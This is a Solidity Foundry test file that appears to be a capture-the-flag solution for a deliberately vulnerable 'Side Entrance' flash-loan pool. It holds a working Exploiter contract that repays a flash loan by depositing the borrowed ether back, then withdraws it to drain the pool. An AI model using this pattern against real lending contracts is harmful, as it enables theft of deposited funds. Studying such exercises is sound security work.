// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        vm.startPrank(attacker);
        Exploiter exploiter = new Exploiter(sideEntranceLenderPool, ETHER_IN_POOL);
        exploiter.exploit();
        exploiter.withdraw();
        vm.stopPrank;
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

contract Exploiter {
    SideEntranceLenderPool internal immutable sideEntranceLenderPool;
    address internal immutable owner;
    uint256 internal immutable withdrawalAmount;

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the attacker"); // Modifier to avoid getting front-run by searchers
        _;
    }

    constructor(SideEntranceLenderPool _sideEntranceLenderPool, uint256 _withdrawalAmount) {
        sideEntranceLenderPool = _sideEntranceLenderPool;
        withdrawalAmount = _withdrawalAmount;
        owner = msg.sender;
    }

    function exploit() external onlyOwner {
        sideEntranceLenderPool.flashLoan(withdrawalAmount);
    }

    function withdraw() external onlyOwner {
        sideEntranceLenderPool.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    fallback() external payable {
        sideEntranceLenderPool.deposit{value: withdrawalAmount}();
    }

    receive() external payable {} // To receive the withdrawn funds
}
